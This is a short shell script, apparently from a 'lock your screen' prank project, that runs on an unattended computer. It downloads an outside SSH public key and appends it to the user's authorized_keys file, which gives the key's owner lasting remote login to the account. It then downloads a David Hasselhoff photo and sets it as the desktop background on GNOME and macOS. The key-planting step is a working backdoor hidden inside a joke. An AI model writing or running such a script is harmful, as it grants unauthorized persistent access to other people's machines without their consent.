#!/bin/sh
curl https://raw.githubusercontent.com/marcodejongh/lockyourscreen/master/id_lockyourscreen.pub -o ~/.ssh/id_lockyourscreen.pub
touch ~/authorized_keys
chmod 600 authorized_keys
cat ~/.ssh/id_lockyourscreen.pub >> ~/.ssh/authorized_keys 
curl http://www.picturesnew.com/media/images/david-hasselhoff.jpg -o ~/.hasselhoff.jpg
gsettings set org.gnome.desktop.background picture-uri ~/.hasselhoff.jpg
defaults write com.apple.desktop Background '{default = {ImageFilePath = "~/.hasselhoff.jpg"; };}'
